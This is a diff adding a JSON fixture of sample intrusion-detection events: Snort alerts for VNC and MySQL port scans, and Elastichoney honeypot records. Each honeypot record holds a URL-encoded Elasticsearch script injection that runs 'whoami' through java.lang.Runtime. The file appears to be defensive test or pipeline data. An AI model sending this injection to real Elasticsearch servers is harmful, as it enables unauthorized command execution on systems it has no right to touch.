@@ -1,0 +1,124 @@
+{
+    "snort_test": {
+        "payloads": [
+            {
+                "tcpseq": "0x8F6D2A1",
+                "tos": 0,
+                "id": 55764,
+                "tcplen": 40,
+                "tcpwin": "0xFAF00000",
+                "sensor": "snort_test",
+                "destination_ip": "192.168.148.149",
+                "signature": "ET SCAN Potential VNC Scan 5900-5920",
+                "timestamp": "2020/11/21 00:30:22.847938",
+                "source_port": 50578,
+                "ethsrc": "00:0C:29:1C:81:D5",
+                "header": "1:2002911:5",
+                "classification": 4,
+                "destination_port": 5917,
+                "ttl": 64,
+                "iplen": 61440,
+                "tcpack": "0x0",
+                "priority": 2,
+                "proto": "TCP",
+                "source_ip": "192.168.148.146",
+                "dgmlen": 60,
+                "ethdst": "00:0C:29:AA:CE:21",
+                "ethtype": "0x800",
+                "ethlen": "0x4A",
+                "tcpflags": "******S*"
+            },
+            {
+                "tcpseq": "0x803767C6",
+                "tos": 0,
+                "id": 34522,
+                "tcplen": 40,
+                "tcpwin": "0xFAF00000",
+                "sensor": "snort_test",
+                "destination_ip": "192.168.148.149",
+                "signature": "ET SCAN Suspicious inbound to mySQL port 3306",
+                "timestamp": "2020/11/21 00:31:37.328075",
+                "source_port": 38320,
+                "ethsrc": "00:0C:29:1C:81:D5",
+                "header": "1:2010937:3",
+                "classification": 3,
+                "destination_port": 3306,
+                "ttl": 64,
+                "iplen": 61440,
+                "tcpack": "0x0",
+                "priority": 2,
+                "proto": "TCP",
+                "source_ip": "192.168.148.146",
+                "dgmlen": 60,
+                "ethdst": "00:0C:29:AA:CE:21",
+                "ethtype": "0x800",
+                "ethlen": "0x4A",
+                "tcpflags": "******S*"
+            }
+        ]
+    },
+    "elastichoney": {
+        "payloads": [
+            {
+                "source": "192.168.148.146",
+                "@timestamp": "2020-11-21T00:33:10.617360303+08:00",
+                "url": "192.168.148.149:9200/_search?pretty",
+                "method": "POST",
+                "form": "pretty=&%7B%0A%09%09%09%22script_fields%22%3A+%7B%0A%09%09%09%09%22myscript%22%3A+%7B%0A%09%09%09%09%09%22script%22%3A+%22java.lang.Math.class.forName%28%5C%22java.lang.Runtime%5C%22%29.getRuntime%28%29.exec%28%5C%22whoami%5C%22%29.getText%28%29%22%0A%09%09%09%09%7D%0A%09%09%09%7D%0A%09%09%7D=",
+                "payload": "",
+                "payloadCommand": "",
+                "payloadResource": "",
+                "payloadMd5": "",
+                "payloadBinary": "",
+                "headers": {
+                    "user_agent": "curl/7.68.0",
+                    "host": "192.168.148.149:9200",
+                    "content_type": "application/x-www-form-urlencoded",
+                    "accept_language": ""
+                },
+                "type": "attack",
+                "honeypot": "218.212.205.87"
+            },
+            {
+                "source": "192.168.148.146",
+                "@timestamp": "2020-11-21T00:33:10.617360303+08:00",
+                "url": "192.168.148.149:9200/_search?pretty",
+                "method": "POST",
+                "form": "pretty=&%7B%0A%09%09%09%22script_fields%22%3A+%7B%0A%09%09%09%09%22myscript%22%3A+%7B%0A%09%09%09%09%09%22script%22%3A+%22java.lang.Math.class.forName%28%5C%22java.lang.Runtime%5C%22%29.getRuntime%28%29.exec%28%5C%22whoami%5C%22%29.getText%28%29%22%0A%09%09%09%09%7D%0A%09%09%09%7D%0A%09%09%7D=",
+                "payload": "",
+                "payloadCommand": "",
+                "payloadResource": "",
+                "payloadMd5": "",
+                "payloadBinary": "",
+                "headers": {
+                    "user_agent": "curl/7.68.0",
+                    "host": "192.168.148.149:9200",
+                    "content_type": "application/x-www-form-urlencoded",
+                    "accept_language": ""
+                },
+                "type": "attack",
+                "honeypot": "218.212.205.87"
+            },
+            {
+                "source": "192.168.148.146",
+                "@timestamp": "2020-11-21T00:33:24.322084703+08:00",
+                "url": "192.168.148.149:9200/_search?pretty",
+                "method": "POST",
+                "form": "pretty=&%7B%0A%09%09%09%22script_fields%22%3A+%7B%0A%09%09%09%09%22myscript%22%3A+%7B%0A%09%09%09%09%09%22script%22%3A+%22java.lang.Math.class.forName%28%5C%22java.lang.Runtime%5C%22%29.getRuntime%28%29.exec%28%5C%22whoami%5C%22%29.getText%28%29%22%0A%09%09%09%09%7D%0A%09%09%09%7D%0A%09%09%7D=",
+                "payload": "",
+                "payloadCommand": "",
+                "payloadResource": "",
+                "payloadMd5": "",
+                "payloadBinary": "",
+                "headers": {
+                    "user_agent": "curl/7.68.0",
+                    "host": "192.168.148.149:9200",
+                    "content_type": "application/x-www-form-urlencoded",
+                    "accept_language": ""
+                },
+                "type": "attack",
+                "honeypot": "218.212.205.87"
+            }
+        ]
+    }
+}
